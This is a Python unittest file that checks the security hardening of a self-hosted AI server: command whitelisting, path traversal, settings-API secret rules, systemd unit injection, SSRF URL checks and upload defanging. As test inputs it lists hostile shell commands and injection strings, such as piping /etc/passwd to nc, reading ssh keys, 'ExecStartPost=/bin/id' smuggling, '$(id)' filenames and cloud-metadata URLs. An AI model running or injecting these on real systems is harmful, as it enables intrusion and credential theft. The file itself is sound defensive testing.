"""The M5 fixes that are not about the login itself (docs/LAYERS.md "M5: Login and hardening"): shell commands, paths, git, the
settings API, remote commands built from client values, URLs the server fetches, uploads. Offline; nothing here runs a program
that is not a harmless one.
"""

import json
import os
import shlex
import shutil
import subprocess
import sys
import tempfile
import unittest
from unittest import mock

ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
sys.path.insert(0, os.path.join(ROOT, "StoneSage", "backend"))
sys.path.insert(0, os.path.join(ROOT, "tests"))

from route_harness import call, call_full, header, server_key  # noqa: E402
from lodestone import config_mask, model_downloader, model_loader, urlcheck  # noqa: E402
from stonesage import command_whitelist as cw, paths, server  # noqa: E402


class TestShellCommands(unittest.TestCase):
    OK = ["ls -la", "git status", "python3 script.py", "python -m pytest tests", "npm test", "pip install requests", "echo 'a b'",
          "grep -rn TODO src", "systemctl status stonesage", "systemctl restart stonesage.service", "cd ..", "pytest -q"]
    BAD = ["echo x; rm -rf ~", "echo x && id", "echo x || id", "ls | sh", "echo $(id)", "echo `id`", "echo ${HOME}", "cat < /etc/passwd",
           "echo x > /tmp/y", "echo x >> /tmp/y", "ls &", "ls\nid", "ls\rid", "ls\x00id", "(ls)",
           "python -c 'import os'", "python3 -cprint", "node -e 1", "node --eval=1", "node -p 1", "git -c core.sshCommand=id fetch",
           "git --upload-pack=id fetch", "git -C / status", "find . -exec id {} +", "find . -delete", "npx -c id", "npm exec x",
           "curl http://127.0.0.1/", "wget http://127.0.0.1/", "bash -c id", "sh script", "powershell -Command id", "nc -l 1", "ssh host",
           "rm -rf /", "/usr/bin/git status", "./git status", "C:\\\\Python\\\\python.exe x", "systemctl restart sshd",
           "systemctl restart stonesage cluster-mcp sshd", "systemctl stop stonesage", "systemctl", "sudo ls", "env ls", "xargs ls",
           "ls 'unterminated", "", "   "]

    def test_plain_commands_pass(self):
        for c in self.OK:
            ok, why = cw.validate_terminal_command(c)
            self.assertTrue(ok, (c, why))

    def test_everything_else_is_refused(self):
        for c in self.BAD:
            ok, why = cw.validate_terminal_command(c)
            self.assertFalse(ok, c)
            self.assertTrue(why)

    def test_the_old_first_word_trick_is_closed(self):
        """The old check read only the first word, so 'echo x; <anything>' passed."""
        for c in ("echo x; touch /tmp/pwned", "git status; id", "ls && id", "cat /etc/passwd | nc host 1"):
            self.assertFalse(cw.validate_terminal_command(c)[0], c)

    def test_parse_returns_an_argv_never_a_string(self):
        ok, _, argv = cw.parse_command("git log --oneline -n 3 'a b'")
        self.assertEqual((ok, argv), (True, ["git", "log", "--oneline", "-n", "3", "a b"]))

    def test_paths_in_arguments_stay_in_the_roots(self):
        with tempfile.TemporaryDirectory() as tmp:
            root = os.path.join(tmp, "ws")
            os.makedirs(os.path.join(root, "src"))
            ok = lambda c, cwd=root: cw.validate_terminal_command(c, cwd=cwd, allowed_roots=[root])
            self.assertTrue(ok("cat src/a.py")[0])
            self.assertTrue(ok("ls .")[0])
            self.assertTrue(ok("git log -n 1")[0])
            for c in ("cat ../outside.txt", "cat /etc/passwd", "cat ~/.ssh/id_rsa", "cat src/../../x", "grep --file=/etc/passwd x",
                      "cp a /tmp/b", "ls .."):
                self.assertFalse(ok(c)[0], c)
            self.assertFalse(ok("ls", cwd=tmp)[0], "the working directory itself must be inside")
            self.assertFalse(ok("ls", cwd=os.path.join(root, ".."))[0])

    def test_run_command_uses_no_shell(self):
        with mock.patch.object(subprocess, "run") as run:
            run.return_value = subprocess.CompletedProcess([], 0, "", "")
            cw.run_command("ls -la", ".")
        argv, kw = run.call_args[0][0], run.call_args[1]
        self.assertEqual(argv, ["ls", "-la"])
        self.assertIs(kw["shell"], False)
        with mock.patch.object(subprocess, "run") as run, self.assertRaises(ValueError):
            cw.run_command("ls; id", ".")
        run.assert_not_called()

    @unittest.skipUnless(shutil.which("git"), "git is not installed")
    def test_a_real_command_runs_and_metacharacters_are_not_taken_literally(self):
        res = cw.run_command("git --version", ".")
        self.assertEqual(res.returncode, 0)
        self.assertIn("git version", res.stdout)

    def test_execute_command_fails_closed(self):
        from stonesage import tool_harness
        with mock.patch.object(subprocess, "run") as run:
            for cmd in ("echo hi; id", "python -c 'x'", "curl http://127.0.0.1", "ls | cat"):
                res = tool_harness.tool_execute_command(cmd)
                self.assertFalse(res["ok"], cmd)
                self.assertIn("rejected", res["error"])
            # the check cannot run (import fails / raises): the command is NOT run
            with mock.patch.object(cw, "validate_terminal_command", side_effect=RuntimeError("broken")):
                res = tool_harness.tool_execute_command("ls")
            self.assertFalse(res["ok"])
            self.assertIn("not run", res["error"])
            with mock.patch.dict(sys.modules, {"stonesage.command_whitelist": None}):
                res = tool_harness.tool_execute_command("ls")
            self.assertFalse(res["ok"])
            run.assert_not_called()

    def test_execute_command_has_no_shell_equals_true(self):
        import importlib.util
        for module in ("stonesage.tool_harness", "stonesage.server", "stonesage.command_whitelist"):
            src = open(importlib.util.find_spec(module).origin, encoding="utf-8").read()      # however it is installed
            self.assertNotIn("shell=True", src, module)


class TestPaths(unittest.TestCase):
    def test_safe_join(self):
        with tempfile.TemporaryDirectory() as tmp:
            root = os.path.join(tmp, "vault")
            os.makedirs(os.path.join(root, "a"))
            self.assertEqual(paths.safe_join(root, "a/b.md"), os.path.realpath(os.path.join(root, "a", "b.md")))
            for bad in ("../x", "a/../../x", "..", "/etc/passwd", "\\windows\\x", "C:\\x", "C:x", "a/\x00b", "....//x/../../..//y"):
                if bad == "....//x/../../..//y":       # normalises to inside or outside: only the outcome matters
                    try:
                        got = paths.safe_join(root, bad)
                        self.assertTrue(got.startswith(os.path.realpath(root)))
                    except ValueError:
                        pass
                    continue
                with self.assertRaises(ValueError, msg=bad):
                    paths.safe_join(root, bad)

    def test_a_symlink_out_of_the_folder_is_refused(self):
        with tempfile.TemporaryDirectory() as tmp:
            root, outside = os.path.join(tmp, "r"), os.path.join(tmp, "o")
            os.makedirs(root)
            os.makedirs(outside)
            try:
                os.symlink(outside, os.path.join(root, "link"))
            except (OSError, NotImplementedError):
                self.skipTest("no symlink permission here")
            with self.assertRaises(ValueError):
                paths.safe_join(root, "link/secret")
            with self.assertRaises(ValueError):
                paths.contained_in_any(os.path.join(root, "link", "secret"), [root])

    def test_a_sibling_with_the_same_prefix_is_not_inside(self):
        with tempfile.TemporaryDirectory() as tmp:
            root, sibling = os.path.join(tmp, "vault"), os.path.join(tmp, "vault-evil")
            os.makedirs(root)
            os.makedirs(sibling)
            with self.assertRaises(ValueError):
                paths.contained_in_any(os.path.join(sibling, "x"), [root])
            with self.assertRaises(ValueError):
                paths.contained_in_any(os.path.join(root, "..", "vault-evil", "x"), [root])
            self.assertTrue(paths.contained_in_any(os.path.join(root, "ok"), [root]))
            with self.assertRaises(ValueError):
                paths.contained_in_any("x", [])


class TestVaultTraversal(unittest.TestCase):
    def setUp(self):
        self.tmp = tempfile.mkdtemp()
        self.addCleanup(shutil.rmtree, self.tmp, True)
        self.vault_dir = os.path.join(self.tmp, "vault")
        os.makedirs(self.vault_dir)
        self.secret = os.path.join(self.tmp, "outside.md")
        open(self.secret, "w").write("OUTSIDE-SECRET-TEXT")
        open(os.path.join(self.vault_dir, "inside.md"), "w").write("inside text")

    def test_the_vault_engine_refuses_paths_that_leave_it(self):
        from stonesage.obsidian_vault import ObsidianVault
        v = ObsidianVault(self.vault_dir)
        self.assertEqual(v.get_note("inside.md")["ok"], True)
        for p in ("../outside.md", "..\\outside.md", "a/../../outside.md", "....//outside.md", self.secret, "..", "a/\x00"):
            for res in (v.get_note(p), v.save_note(p, "pwned"), v.delete_note(p)):
                self.assertNotEqual(res.get("content"), "OUTSIDE-SECRET-TEXT", p)
                self.assertFalse(res.get("ok") and p != "a/\x00" and "outside" in json.dumps(res), (p, res))
        self.assertEqual(open(self.secret).read(), "OUTSIDE-SECRET-TEXT")
        self.assertTrue(os.path.exists(self.secret))
        self.assertFalse(os.path.exists(os.path.join(self.tmp, "outside.md.md")))

    def test_the_note_route_never_reads_outside_the_vault(self):
        with mock.patch.dict(server.config, {"obsidian": {"user_vault_path": self.vault_dir}}):
            for p in ("../outside.md", "..%2Foutside.md", "a/../../outside.md", "%2e%2e/outside.md", self.secret.replace("\\", "/")):
                status, _, payload = call("GET", "/api/obsidian/note?path=" + p)
                self.assertNotIn(b"OUTSIDE-SECRET-TEXT", payload, p)
            status, _, payload = call("GET", "/api/obsidian/note?path=inside.md")
            self.assertIn(b"inside text", payload)

    @mock.patch.dict(server.config, {"features": {"shelved": True}})        # a shelved route: the flag must be on for the id check to be reached
    def test_a_dossier_id_is_a_name_not_a_path(self):
        for bad in ("../../etc/passwd", "..\\x", "a/b", "x..y", "", ".hidden"):
            status, _, _ = call("GET", "/api/hivemind/dossier/content?id=" + bad.replace("\\", "%5C"))
            self.assertIn(status, (400,), bad)


class TestSettingsApi(unittest.TestCase):
    def setUp(self):
        self.tmp = tempfile.mkdtemp()
        self.addCleanup(shutil.rmtree, self.tmp, True)
        self.cfg_path = os.path.join(self.tmp, "config.json")
        self.initial = {"homeassistant": {"url": "http://192.0.2.10:8123", "token": "ha-token-0123456789"},
                        "proxmox": {"cluster_url": "https://192.0.2.20:8006", "token_value": "user@pam!t=0123456789abcdef"},
                        "boost": {"providers": {"groq": {"api_key": "gsk_0123456789abcdef", "base_url": "https://api.example.invalid/v1",
                                                         "tier": "no_training"}}},
                        "cluster": {"ssh_user": "ops"}, "api": {"key": server_key()}, "features": {}}
        json.dump(self.initial, open(self.cfg_path, "w"))
        for name, value in (("CONFIG_FILE", self.cfg_path), ("proxmox", server.proxmox), ("cluster", server.cluster)):
            p = mock.patch.object(server, name, value)
            p.start()
            self.addCleanup(p.stop)

    def saved(self):
        return json.load(open(self.cfg_path))

    def test_the_login_key_and_feature_flags_cannot_be_written_through_the_api(self):
        status, _, payload = call("POST", "/api/config", {"features": {"web_terminal": True, "file_editor": True}, "api": {"key": "x"},
                                                           "apps": ["evil"], "workspace_roots": [{"path": "/"}], "cluster": {"note": "ok"}})
        self.assertEqual(status, 200, payload)
        data = json.loads(payload)
        self.assertEqual(sorted(data["ignored"]), ["api", "apps", "features", "workspace_roots"])
        saved = self.saved()
        self.assertEqual(saved["features"], {})
        self.assertEqual(saved["api"], self.initial["api"])
        self.assertNotIn("apps", saved)
        self.assertNotIn("workspace_roots", saved)
        self.assertEqual(saved["cluster"]["note"], "ok", "ordinary settings still save")

    def test_a_changed_destination_needs_its_secret_in_the_same_request(self):
        cases = [{"homeassistant": {"url": "http://192.0.2.99:8123"}},
                 {"proxmox": {"cluster_url": "https://192.0.2.99:8006"}},
                 {"boost": {"providers": {"groq": {"base_url": "https://attacker.example.invalid/v1"}}}},
                 {"boost": {"providers": {"groq": {"tier": "local"}}}}]
        for body in cases:
            status, _, payload = call("POST", "/api/config", body)
            self.assertEqual(status, 400, body)
            self.assertIn("again", json.loads(payload)["error"])
            self.assertEqual(self.saved()["homeassistant"], self.initial["homeassistant"], body)
            self.assertEqual(self.saved()["boost"], self.initial["boost"], body)
            self.assertEqual(self.saved()["proxmox"], self.initial["proxmox"], body)
        # a masked echo of the stored secret is not "entering it again"
        masked = {"homeassistant": {"url": "http://192.0.2.99:8123", "token": config_mask.MASK + "6789"}}
        self.assertEqual(call("POST", "/api/config", masked)[0], 400)
        # with the secret re-entered, the change goes through
        ok = {"homeassistant": {"url": "http://192.0.2.99:8123", "token": "new-token-9876543210"}}
        self.assertEqual(call("POST", "/api/config", ok)[0], 200)
        self.assertEqual(self.saved()["homeassistant"], ok["homeassistant"])

    def test_an_unchanged_destination_and_other_settings_need_nothing(self):
        body = {"homeassistant": {"url": "http://192.0.2.10:8123", "token": config_mask.MASK + "6789"}, "cluster": {"default_model": "m"}}
        self.assertEqual(call("POST", "/api/config", body)[0], 200)
        saved = self.saved()
        self.assertEqual(saved["homeassistant"]["token"], "ha-token-0123456789", "a masked echo never overwrites the secret")
        self.assertEqual(saved["cluster"]["default_model"], "m")

    def test_boost_settings_follow_the_same_rule(self):
        status, _, _ = call("POST", "/api/boost/settings", {"providers": {"groq": {"base_url": "https://attacker.example.invalid/v1"}}})
        self.assertIn(status, (400, 503))      # 503: Boost not configured in this test config, which is as closed
        self.assertEqual(self.saved()["boost"], self.initial["boost"])

    def test_the_config_file_is_written_owner_only_and_atomically(self):
        server.save_config(dict(self.initial, cluster={"ssh_user": "ops", "x": 1}))
        self.assertEqual(self.saved()["cluster"]["x"], 1)
        if os.name != "nt":
            self.assertEqual(os.stat(self.cfg_path).st_mode & 0o777, 0o600)
        self.assertEqual([f for f in os.listdir(self.tmp) if f.startswith(".config-")], [], "no temp file left behind")

    def test_get_config_masks_every_secret_and_nothing_else_leaks(self):
        full = {"api": {"key": "server-key-0123456789abcdef"}, "alexa_relay": {"key": "a" * 64}, "gemini_web": {"psid": "p" * 40, "psidts": "q" * 40},
                "x": {"some_key": "k" * 30, "token": "t" * 30, "password": "pw" * 10, "client_secret": "s" * 30, "psid_extra": "z" * 30,
                      "cookie": "c" * 30, "private_thing": "v" * 30},
                "cluster": {"valkey_url": "redis://user:hunter2secret@192.0.2.5:6379/0", "ok": "visible"}}
        out = json.dumps(config_mask.mask(full))
        for secret in ("server-key-0123456789abcdef", "a" * 64, "p" * 40, "q" * 40, "k" * 30, "t" * 30, "pw" * 10, "s" * 30, "z" * 30,
                       "c" * 30, "v" * 30, "hunter2secret"):
            self.assertNotIn(secret, out)
        self.assertIn("visible", out)
        self.assertIn("redis://user:", out, "the rest of a URL stays readable")


class TestRemoteCommands(unittest.TestCase):
    def test_unit_values_cannot_start_a_new_directive_or_expand(self):
        for bad in ("a\nExecStartPost=/bin/id", "a\rb", "a\x00b"):
            with self.assertRaises(ValueError):
                model_loader.unit_token(bad)
        self.assertEqual(model_loader.unit_token("plain"), "plain")
        self.assertEqual(model_loader.unit_token("50%"), "50%%", "systemd would read a lone % as a specifier")
        self.assertEqual(model_loader.unit_token("$HOME"), "'$$HOME'")
        text = "[Service]\nExecStart=/usr/local/bin/llama-server \\\n    --model /m.gguf \\\n    --alias x\n"
        unit = model_loader.parse_unit(text)
        model_loader.flag_set(unit, "--chat-template", "{% if x %}100% $y{% endif %}")
        again = model_loader.parse_unit(model_loader.render_unit(unit))
        self.assertEqual(model_loader.flag_get(again, "--chat-template"), "{% if x %}100% $y{% endif %}", "it round-trips")
        model_loader.flag_set(unit, "--system-prompt", "line1\nExecStartPost=/bin/id")
        with self.assertRaises(ValueError):
            model_loader.render_unit(unit)
        unit2 = model_loader.parse_unit(text)
        unit2["args"].append(["--evil\nExecStartPost=/bin/id", None])
        with self.assertRaises(ValueError):
            model_loader.render_unit(unit2)
        with self.assertRaises(ValueError):
            model_loader.render_unit(model_loader.parse_unit(text), env={"A": "b\nExecStartPost=/bin/id"})
        with self.assertRaises(ValueError):
            model_loader.render_unit(model_loader.parse_unit(text), description="x\n[Install]")

    def test_apply_parameters_refuses_control_characters_before_anything_is_sent(self):
        unit = "[Service]\nExecStart=/usr/local/bin/llama-server --model /m.gguf --port 8001 --alias a\n"
        calls = []

        def fake_run(argv, *a, **kw):
            calls.append((argv, kw.get("input")))
            return subprocess.CompletedProcess(argv, 0, unit, "")
        with mock.patch.object(subprocess, "run", fake_run):
            ok, msg = server.apply_llama_parameters("llama-moe.service", 8001, "moe", {"model": "/m.gguf", "n_ctx": 4096,
                                                                                      "system_prompt": "x\nExecStartPost=/bin/id"})
            self.assertFalse(ok)
            self.assertIn("Refused", msg)
            self.assertEqual(len(calls), 1, "only the read of the old unit ran; nothing was written")
            ok, msg = server.apply_llama_parameters("x; id", 8001, "a", {})
            self.assertEqual((ok, msg), (False, "Refused: not a service name"))
            self.assertEqual(len(calls), 1)

    def test_apply_parameters_quotes_custom_flags_per_word(self):
        unit = "[Service]\nExecStart=/usr/local/bin/llama-server --model /m.gguf --port 8001 --alias a\n"
        sent = {}

        def fake_run(argv, *a, **kw):
            if kw.get("input"):
                sent.setdefault("script", kw["input"])          # the first script is the apply; a later one is the rollback
            return subprocess.CompletedProcess(argv, 0, unit, "")
        with mock.patch.object(subprocess, "run", fake_run), mock.patch.object(server.time, "sleep"), \
                mock.patch("urllib.request.urlopen", side_effect=OSError("no network")):
            server.apply_llama_parameters("llama-moe.service", 8001, "moe", {"model": "/m.gguf", "n_ctx": 4096,
                                                                           "custom_flags": "--foo 'a b' --bar=1%"})
        import base64
        import re
        b64 = re.search(r"echo '([A-Za-z0-9+/=]+)' \| base64", sent["script"]).group(1)
        written = base64.b64decode(b64).decode()
        exec_lines = [l for l in written.splitlines() if l.startswith("ExecStart=")]
        self.assertEqual(len(exec_lines), 1)
        self.assertEqual(shlex.split(exec_lines[0][len("ExecStart="):])[-3:], ["--foo", "a b", "--bar=1%%"])
        self.assertEqual(written.count("ExecStart"), 1)

    def test_delete_model_takes_only_a_plain_gguf_name(self):
        with mock.patch.object(subprocess, "run") as run:
            for bad in ("a;touch x;.gguf", "$(id).gguf", "a b.gguf", "`id`.gguf", "x.gguf;id", ".hidden.gguf", "a|b.gguf", "../../etc/passwd",
                        "model.bin", ""):
                status, _, _ = call("POST", "/api/cluster/delete-model", {"model": bad})
                self.assertEqual(status, 400, bad)
            run.assert_not_called()

    def test_delete_model_quotes_what_it_sends(self):
        sent = []

        def fake_run(argv, *a, **kw):
            sent.append(argv)
            return subprocess.CompletedProcess(argv, 1 if len(sent) == 1 else 0, "", "")
        with mock.patch.object(subprocess, "run", fake_run), mock.patch.object(server.system_profile, "get_profile", return_value={}), \
                mock.patch.object(server.system_profile, "loaded_model_files", return_value=[]):
            call("POST", "/api/cluster/delete-model", {"model": "ok-model_1.Q4.gguf"})
        self.assertTrue(any("rm -f -- " in " ".join(a) and "ok-model_1.Q4.gguf" in " ".join(a) for a in sent), sent)

    def test_download_names_and_urls_are_checked(self):
        mgr = model_downloader.ModelDownloadManager()
        with mock.patch.object(subprocess, "run") as run, mock.patch("threading.Thread") as thread:
            for name in ("a;id.gguf", "../x.gguf", "a b.gguf", "$(id).gguf", "x/y.gguf", "x\\y.gguf", "a`id`.gguf"):
                res = mgr.start_download("https://example.invalid/m.gguf", custom_filename=name)
                self.assertFalse(res["ok"], name)
            for url in ("file:///etc/passwd", "ftp://example.invalid/m.gguf", "http://127.0.0.1:9/m.gguf", "https://169.254.169.254/m.gguf",
                        "http://localhost/m.gguf", "gopher://x/m.gguf"):
                res = mgr.start_download(url, custom_filename="m.gguf")
                self.assertFalse(res["ok"], url)
            run.assert_not_called()
            thread.assert_not_called()

    def test_the_remote_cancel_quotes_the_name(self):
        mgr = model_downloader.ModelDownloadManager()
        seen = []
        with mock.patch.object(model_downloader.endpoints, "ssh_cmd", side_effect=lambda cfg, cmd, **kw: seen.append(cmd) or ["true"]), \
                mock.patch.object(subprocess, "run"):
            mgr._cancel_remote_download("good-name.gguf")
            mgr._cancel_remote_download("evil;id;.gguf")
        self.assertIn("/opt/models/good-name.gguf.part", seen[0])
        self.assertNotIn("evil", seen[1])
        self.assertIn("rm -f --", seen[0])


class TestUrlsTheServerFetches(unittest.TestCase):
    def test_check_fetch_url(self):
        ok = ["https://example.invalid/x", "http://192.0.2.10:8080/x", "http://10.0.0.5/x", "https://[2001:db8::1]/x"]
        for u in ok:
            self.assertEqual(urlcheck.check_fetch_url(u, resolve=False), u)
        bad = ["file:///etc/passwd", "ftp://x/y", "gopher://x", "javascript:alert(1)", "http://127.0.0.1/", "http://127.1.2.3:99/",
               "http://localhost/", "http://x.localhost/", "http://169.254.169.254/latest", "http://[::1]/", "http://[fe80::1]/",
               "http://0.0.0.0/", "http://metadata.google.internal/", "http://[::ffff:127.0.0.1]/", "", "http://", "http://a b/",
               "http://x/\r\nHost: y"]
        for u in bad:
            with self.assertRaises(ValueError, msg=u):
                urlcheck.check_fetch_url(u, resolve=False)

    def test_tool_ingest_refuses_file_urls(self):
        from stonesage.tool_harness import tool_registry
        res = tool_registry.ingest_tool_from_url("file:///etc/passwd")
        self.assertFalse(res["ok"])
        self.assertNotIn("passwd", json.dumps(res.get("tool_name", "")))

    def test_a_private_range_can_be_refused_when_asked(self):
        with self.assertRaises(ValueError):
            urlcheck.check_fetch_url("http://10.0.0.5/", allow_private=False, resolve=False)

    def test_the_edge_reload_download_url_is_checked_before_any_node_is_told_to_fetch_it(self):
        """The review's edge/reload note: the URL the edge nodes are told to pull goes through the same check."""
        from harness.edge_fleet.ota_reload import ota_distributor
        with mock.patch.object(ota_distributor, "notify_edge_nodes_new_model", return_value={"node-1": "queued"}) as notify, \
                mock.patch.object(server, "forward_to_active_harness", return_value=None):
            for bad in ("file:///etc/passwd", "http://127.0.0.1:9000/m.gguf", "http://169.254.169.254/latest", "ftp://example.invalid/m.gguf",
                        "http://localhost/m.gguf", "javascript:alert(1)", "http://x/\r\nHost: y"):
                status, _, payload = call("POST", "/api/harness/edge/reload", {"model_name": "m", "download_url": bad, "checksum": "ab"})
                self.assertEqual(status, 400, bad)
                self.assertIn("download_url refused", json.loads(payload)["error"])
            notify.assert_not_called()
            ok = "https://example.invalid/models/m.gguf"
            status, _, payload = call("POST", "/api/harness/edge/reload", {"model_name": "m", "download_url": ok, "checksum": "ab"})
            self.assertEqual(status, 200)
            self.assertEqual(notify.call_args.kwargs["gguf_artifact_url"], ok)
            status, _, _ = call("POST", "/api/harness/edge/reload", {"model_name": "m"})          # no URL at all: as before
            self.assertEqual(status, 200)


class TestUploads(unittest.TestCase):
    def setUp(self):
        self.tmp = tempfile.mkdtemp()
        self.addCleanup(shutil.rmtree, self.tmp, True)
        p = mock.patch.object(server, "UPLOADS_DIR", self.tmp)
        p.start()
        self.addCleanup(p.stop)

    def upload(self, name, data=b"<script>alert(1)</script>"):
        import base64
        status, _, payload = call("POST", "/api/files/upload", {"filename": name, "data_base64": base64.b64encode(data).decode()})
        return status, json.loads(payload)

    def test_an_executable_type_is_never_stored_under_its_own_extension(self):
        for name in ("x.html", "x.svg", "x.js", "x.htm", "x.xhtml", "x.php", "x"):
            status, data = self.upload(name)
            self.assertEqual(status, 200, name)
            self.assertTrue(data["safe_name"].endswith(".bin"), (name, data["safe_name"]))

    def test_uploads_are_served_defanged(self):
        status, data = self.upload("page.html")
        status, hdrs, payload = call_full("GET", data["url"])
        self.assertEqual(status, 200)
        self.assertEqual(header(hdrs, "Content-Type"), "application/octet-stream")
        self.assertIn("attachment", header(hdrs, "Content-Disposition"))
        self.assertIn("sandbox", header(hdrs, "Content-Security-Policy"))
        self.assertEqual(header(hdrs, "X-Content-Type-Options"), "nosniff")
        status, data = self.upload("pic.png", b"\x89PNG\r\n")
        _, hdrs, _ = call_full("GET", data["url"])
        self.assertEqual(header(hdrs, "Content-Type"), "image/png")
        self.assertIsNone(header(hdrs, "Content-Disposition"))

    def test_uploads_need_the_login_and_are_size_capped(self):
        self.assertEqual(call("GET", "/api/uploads/x.png", auth=False)[0], 401)
        self.assertEqual(call("POST", "/api/files/upload", {"filename": "a.png"}, auth=False)[0], 401)
        with mock.patch.object(server, "MAX_UPLOAD_BYTES", 10):
            status, data = self.upload("big.png", b"x" * 100)
        self.assertEqual(status, 413)

    def test_a_huge_body_is_refused_before_it_is_read(self):
        status, _, _ = call("POST", "/api/files/upload", None, headers={"Content-Length": str(server.MAX_BODY_BYTES + 1)})
        self.assertEqual(status, 413)


class TestSshCalls(unittest.TestCase):
    def test_every_ssh_command_ends_its_options_before_the_target(self):
        """`ssh -oProxyCommand=... x` is a command: a user or host that starts with '-' is read as an option. Every place that
        builds an ssh argv puts `--` before the target (and the target is checked: endpoints.check_ssh_target)."""
        import importlib.util
        import re
        seen, bad = 0, []
        for pkg in ("lodestone", "stonesage", "hearth", "harness"):
            spec = importlib.util.find_spec(pkg)
            for folder in (spec.submodule_search_locations or []) if spec else []:
                for dirpath, _d, files in os.walk(folder):
                    for f in files:
                        if not f.endswith(".py"):
                            continue
                        text = open(os.path.join(dirpath, f), encoding="utf-8", errors="ignore").read()
                        for m in re.finditer(r'\[\s*"ssh"', text):
                            seen += 1
                            if '"--"' not in text[m.start():m.start() + 260]:
                                bad.append(os.path.join(dirpath, f) + ":" + str(text[:m.start()].count("\n") + 1))
        self.assertGreaterEqual(seen, 5, "the scan found too few ssh calls: it went blind")
        self.assertEqual(bad, [])


class TestHarnessClientKey(unittest.TestCase):
    def test_the_boost_node_and_client_send_the_key(self):
        from harness.core.llama_client import LlamaClient
        self.assertEqual(LlamaClient("http://x/v1", api_key=" k ")._headers({})["Authorization"], "Bearer k")
        self.assertNotIn("Authorization", LlamaClient("http://x/v1")._headers({}))


if __name__ == "__main__":
    unittest.main()
